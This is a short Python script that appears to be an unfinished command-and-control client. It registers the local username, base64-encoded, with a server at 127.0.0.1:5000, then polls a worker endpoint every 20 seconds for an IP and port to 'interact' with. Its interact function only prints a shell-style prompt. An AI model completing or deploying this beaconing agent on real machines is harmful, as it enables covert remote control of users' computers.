import requests, base64, os, time, json
import platform

server_name = "127.0.0.1:5000"
url = "http://" + server_name

username = os.getlogin()
my_alias = requests.post(url + "/register", data={"buba": base64.b64encode(username.encode()).decode()}).json()['alias']

def interact(ip, port):
    pwd = os.getcwd()
    username = os.getlogin()
    print(f"{username}@{pwd} >> ")

while True:
    r = requests.post(url + "/worker/" + my_alias)
    if r.ok:
        interact(r.json()["ip"], r.json()["port"])
    
    time.sleep(20)
